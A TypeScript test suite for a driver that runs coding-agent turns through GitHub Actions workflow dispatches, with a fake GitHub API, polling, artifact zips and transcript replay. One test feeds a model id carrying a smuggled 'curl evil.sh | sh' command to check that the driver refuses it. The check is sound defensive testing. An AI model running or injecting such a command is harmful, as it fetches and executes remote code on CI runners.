import { strict as assert } from 'node:assert'
import { test } from 'node:test'
import { ActionsDriver, replayTranscript, type FetchLike } from './actions.js'
import type { Driver, DriverEvent } from './types.js'

/**
 * A real `claude-code-action@v1` `execution_file`, trimmed: the same SDKMessage objects the
 * CLI prints one per line, wrapped in an array. That array-vs-JSONL difference is the entire
 * adapter, which is what makes this driver cheap.
 */
const EXECUTION = JSON.stringify([
  { type: 'system', subtype: 'init', session_id: 'sess-abc' },
  { type: 'assistant', session_id: 'sess-abc', message: { content: [{ type: 'text', text: 'Adding the flag.' }] } },
  { type: 'assistant', session_id: 'sess-abc', message: { content: [{ type: 'tool_use', name: 'Edit' }] } },
  {
    type: 'result',
    subtype: 'success',
    session_id: 'sess-abc',
    result: 'Added the --verbose flag.',
    total_cost_usd: 0.42,
    usage: { input_tokens: 120, output_tokens: 30, cache_read_input_tokens: 900, cache_creation_input_tokens: 40 },
  },
])

/** A minimal stored (uncompressed) zip, which is what the artifact download returns. */
function makeZip(files: { name: string; body: string }[]): Buffer {
  const locals: Buffer[] = []
  const centrals: Buffer[] = []
  let offset = 0
  for (const file of files) {
    const data = Buffer.from(file.body, 'utf8')
    const name = Buffer.from(file.name, 'utf8')
    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt32LE(data.length, 18)
    local.writeUInt32LE(data.length, 22)
    local.writeUInt16LE(name.length, 26)
    locals.push(local, name, data)
    const central = Buffer.alloc(46)
    central.writeUInt32LE(0x02014b50, 0)
    central.writeUInt32LE(data.length, 20)
    central.writeUInt32LE(data.length, 24)
    central.writeUInt16LE(name.length, 28)
    central.writeUInt32LE(offset, 42)
    centrals.push(central, name)
    offset += local.length + name.length + data.length
  }
  const centralBytes = Buffer.concat(centrals)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0)
  eocd.writeUInt16LE(files.length, 8)
  eocd.writeUInt16LE(files.length, 10)
  eocd.writeUInt32LE(centralBytes.length, 12)
  eocd.writeUInt32LE(offset, 16)
  return Buffer.concat([...locals, centralBytes, eocd])
}

interface Call {
  url: string
  method: string
  body: unknown
}

interface FakeOptions {
  /** Statuses the run reports on successive polls. Default: completed straight away. */
  runs?: { status: string; conclusion?: string }[]
  execution?: string
  meta?: string
  /** Files the contents API serves, by path. */
  contents?: Record<string, string>
}

/** A GitHub REST double that records every call. */
function fakeGitHub(opts: FakeOptions = {}): { fetch: FetchLike; calls: Call[] } {
  const calls: Call[] = []
  const runs = opts.runs ?? [{ status: 'completed', conclusion: 'success' }]
  let poll = 0

  const json = (body: unknown): Response => ({ ok: true, status: 200, statusText: 'OK', json: async () => body }) as unknown as Response

  const fetch: FetchLike = async (url, init = {}) => {
    const method = init.method ?? 'GET'
    calls.push({ url, method, body: typeof init.body === 'string' ? JSON.parse(init.body) : undefined })

    if (url.includes('/dispatches')) return { ok: true, status: 204, statusText: 'No Content' } as unknown as Response

    if (url.includes('/actions/runs?')) {
      const state = runs[Math.min(poll++, runs.length - 1)]!
      // The run we are looking for is the one the *latest* dispatch created, not the first:
      // a second turn polls for its own correlation id, never the previous turn's.
      const correlation = calls.filter(c => c.url.includes('/dispatches')).at(-1)?.body as { inputs?: { correlation_id?: string } } | undefined
      return json({
        workflow_runs: [
          { id: 77, name: `framework-agent ${correlation?.inputs?.correlation_id}`, status: state.status, conclusion: state.conclusion ?? null, html_url: 'https://github.com/o/r/actions/runs/77' },
        ],
      })
    }

    if (url.includes('/artifacts') && !url.endsWith('/zip')) return json({ artifacts: [{ id: 5, name: 'framework-run-actions-1-turn-1' }] })

    if (url.endsWith('/zip')) {
      const zip = makeZip([
        { name: 'execution.json', body: opts.execution ?? EXECUTION },
        { name: 'meta.json', body: opts.meta ?? JSON.stringify({ branch: 'claude/issue-610', session_id: 'sess-abc' }) },
      ])
      return { ok: true, status: 200, statusText: 'OK', arrayBuffer: async () => zip.buffer.slice(zip.byteOffset, zip.byteOffset + zip.byteLength) } as unknown as Response
    }

    if (url.includes('/contents/')) {
      const path = decodeURIComponent(url.split('/contents/')[1]!.split('?')[0]!)
      const body = opts.contents?.[path]
      if (body === undefined) return { ok: false, status: 404, statusText: 'Not Found', text: async () => 'not found' } as unknown as Response
      return json({ content: Buffer.from(body, 'utf8').toString('base64'), encoding: 'base64' })
    }

    throw new Error(`unexpected call: ${url}`)
  }
  return { fetch, calls }
}

function makeDriver(opts: FakeOptions = {}): { driver: ActionsDriver; calls: Call[] } {
  const { fetch, calls } = fakeGitHub(opts)
  // A fake clock that only the sleeps advance, so polling costs no wall-clock time and a run
  // that never finishes fails the test in ten polls instead of spinning for the real timeout.
  let clock = 0
  const driver = new ActionsDriver({
    owner: 'o',
    repo: 'r',
    token: 't',
    fetch,
    pollIntervalMs: 1000,
    timeoutMs: 10_000,
    now: () => clock,
    sleep: async ms => void (clock += ms),
  })
  return { driver, calls }
}

test('ActionsDriver dispatches, polls, and returns the run transcript as a turn (#610)', async () => {
  const { driver, calls } = makeDriver({ runs: [{ status: 'queued' }, { status: 'in_progress' }, { status: 'completed', conclusion: 'success' }] })
  const session = await driver.start({ cwd: '/ws' })
  const turn = await session.prompt('add a --verbose flag')

  assert.equal(turn.text, 'Added the --verbose flag.')
  assert.equal(turn.sessionId, 'sess-abc')
  assert.deepEqual(turn.usage, { costUsd: 0.42, inputTokens: 120, outputTokens: 30, cacheReadTokens: 900, cacheCreationTokens: 40 })
  // It kept polling while the run was queued and in progress, rather than reading it early.
  assert.equal(calls.filter(c => c.url.includes('/actions/runs?')).length, 3)
})

test('ActionsDriver dispatches the prompt with a correlation id and the framing in front (#610)', async () => {
  const { driver, calls } = makeDriver()
  const session = await driver.start({ cwd: '/ws', system: 'You are careful.' })
  await session.prompt('do the thing', { system: 'Also: be brief.' })

  const dispatch = calls.find(c => c.url.includes('/dispatches'))!
  assert.match(dispatch.url, /\/repos\/o\/r\/actions\/workflows\/framework-agent\.yml\/dispatches$/)
  const body = dispatch.body as { ref: string; inputs: Record<string, string> }
  assert.equal(body.ref, 'main')
  // The action takes the prompt as an input, so the framing can ride in front of it safely.
  assert.equal(body.inputs['prompt'], 'You are careful.\n\nAlso: be brief.\n\ndo the thing')
  // The dispatch API returns no run id, so the correlation id is the only way back to the run.
  assert.equal(body.inputs['correlation_id'], `${session.id}-turn-1`)
})

test('ActionsDriver runs the next turn on the branch the last one pushed (#610)', async () => {
  const { driver, calls } = makeDriver()
  const session = await driver.start({ cwd: '/ws' })
  await session.prompt('first')
  await session.prompt('second')

  const dispatches = calls.filter(c => c.url.includes('/dispatches')).map(c => c.body as { ref: string })
  // Every turn is a fresh runner and a fresh checkout, so continuity is the branch, not the machine.
  assert.deepEqual(
    dispatches.map(d => d.ref),
    ['main', 'claude/issue-610'],
  )
})

test('ActionsDriver continues the agent session when the turn asks to resume (#714, #720)', async () => {
  const { driver, calls } = makeDriver()
  const session = await driver.start({ cwd: '/ws' })
  await session.prompt('first')
  await session.prompt('follow-up', { resume: true })

  const inputs = calls.filter(c => c.url.includes('/dispatches')).map(c => (c.body as { inputs: Record<string, string> }).inputs)
  assert.equal(inputs[0]!['resume_session_id'], undefined)
  assert.equal(inputs[1]!['resume_session_id'], 'sess-abc')
})

test('ActionsDriver passes the model through (#628)', async () => {
  const { driver, calls } = makeDriver()
  const session = await driver.start({ cwd: '/ws', model: 'claude-opus-4-8' })
  await session.prompt('go')
  assert.equal((calls.find(c => c.url.includes('/dispatches'))!.body as { inputs: Record<string, string> }).inputs['model'], 'claude-opus-4-8')
})

test('ActionsDriver refuses a model id that could break out of the runner shell (#610)', async () => {
  const { driver } = makeDriver()
  const session = await driver.start({ cwd: '/ws', model: 'opus"; curl evil.sh | sh #' })
  // The workflow composes its args from environment variables, and this is the belt to that
  // brace: an id that is not an id never reaches the runner at all.
  await assert.rejects(() => session.prompt('go'), /Refusing to pass an unsafe model/)
})

test('ActionsDriver fails the turn when the run does, naming the run (#610)', async () => {
  const { driver } = makeDriver({ runs: [{ status: 'completed', conclusion: 'failure' }] })
  const session = await driver.start({ cwd: '/ws' })
  // A red run must not pass as a result, and the URL is the only way to see why it went red.
  await assert.rejects(() => session.prompt('go'), /concluded "failure".*runs\/77/s)
})

test('ActionsDriver gives up rather than polling a run forever (#610)', async () => {
  const { fetch } = fakeGitHub({ runs: [{ status: 'in_progress' }] })
  let clock = 0
  const driver = new ActionsDriver({ owner: 'o', repo: 'r', token: 't', fetch, pollIntervalMs: 1000, timeoutMs: 5000, now: () => clock, sleep: async ms => void (clock += ms) })
  const session = await driver.start({ cwd: '/ws' })
  await assert.rejects(() => session.prompt('go'), /Timed out waiting/)
})

test('ActionsDriver reads produced code off the pushed branch, since the runner is gone (#610)', async () => {
  const { driver, calls } = makeDriver({ contents: { 'src/cli.ts': 'export const verbose = true\n' } })
  const session = await driver.start({ cwd: '/ws' })
  await session.prompt('go')

  assert.equal(await session.readCode!('src/cli.ts'), 'export const verbose = true\n')
  // Read from the branch the run pushed, not from the default branch.
  assert.match(calls.at(-1)!.url, /\/contents\/src\/cli\.ts\?ref=claude%2Fissue-610$/)
})

test('ActionsDriver says so plainly when there is no branch to read code from yet (#610)', async () => {
  const { driver } = makeDriver()
  const session = await driver.start({ cwd: '/ws' })
  await assert.rejects(() => session.readCode!('src/cli.ts'), /only available after a run has pushed one/)
})

test('ActionsDriver replays the run events for the dashboard, in a burst at the end (#610)', async () => {
  const events: DriverEvent[] = []
  const { driver } = makeDriver()
  const session = await driver.start({ cwd: '/ws', onEvent: e => events.push(e) })
  await session.prompt('go')

  assert.equal(events[0]?.type, 'start')
  assert.ok(events.some(e => e.type === 'text' && e.text === 'Adding the flag.'))
  assert.ok(events.some(e => e.type === 'action' && e.label === 'Edit'))
  assert.ok(events.some(e => e.type === 'action' && e.label.includes('runs/77')))
  assert.equal(events.at(-1)?.type, 'result')
})

test('ActionsDriver cannot report a quota, so it says so by omission (#610)', () => {
  // The quota belongs to whichever account's token the repo holds, and the runner that
  // could have answered is torn down before we ever read it.
  const driver: Driver = new ActionsDriver({ owner: 'o', repo: 'r', token: 't' })
  assert.equal(driver.readQuota, undefined)
})

test('replayTranscript reads the action execution file with the existing stream parser (#610)', () => {
  const events: DriverEvent[] = []
  const turn = replayTranscript(EXECUTION, e => events.push(e))
  assert.equal(turn.text, 'Added the --verbose flag.')
  assert.equal(turn.sessionId, 'sess-abc')
  assert.deepEqual(
    events.map(e => e.type),
    ['text', 'action'],
  )
})

test('replayTranscript rejects a transcript that is not a message array (#610)', () => {
  // An empty turn from a crashed run is fine; a silently-empty turn from a shape we did
  // not recognize is not, since it would read as an agent that did nothing.
  assert.deepEqual(replayTranscript('[]'), { text: '' })
  assert.throws(() => replayTranscript('{"type":"result"}'), /not a JSON array/)
  assert.throws(() => replayTranscript('not json'), /Could not parse the run transcript/)
})
